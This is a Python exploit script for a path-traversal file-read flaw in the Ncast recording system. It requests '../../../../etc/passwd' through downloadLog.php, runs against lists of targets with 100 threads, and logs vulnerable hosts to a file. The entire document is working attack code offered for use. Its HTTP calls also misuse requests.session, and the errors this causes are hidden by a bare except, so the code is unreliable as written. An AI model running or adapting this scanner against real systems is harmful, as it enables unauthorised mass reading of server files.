import argparse,requests,sys,json
from multiprocessing.dummy import Pool

def poc(target):
    
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    payload="/developLog/downloadLog.php?name=../../../../etc/passwd"

    header= {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'close',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }

    try:
        re1=requests.session(url=target,timeout=5,headers=header,verify=False)

        if re1.status_code==200:

            re2 = requests.session(url=target+payload,timeout=5,headers=header,verify=False)

            if 'root'in re2.text:    #判断响应包内容是否符合

                print(f'[+]{target}存在文件读取')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
            else:
                print(f'[-]{target}不存在漏洞')
        else:
            print(f'[*]{target}访问有问题')
    except:
        pass

    
def main():
    
    parse = argparse.ArgumentParser(description="Ncast高清智能录播系统存在任意文件读取漏洞")

    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')

    args =parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Python {sys.argv[0]} ")
            
    
if __name__=='__main__':
    main()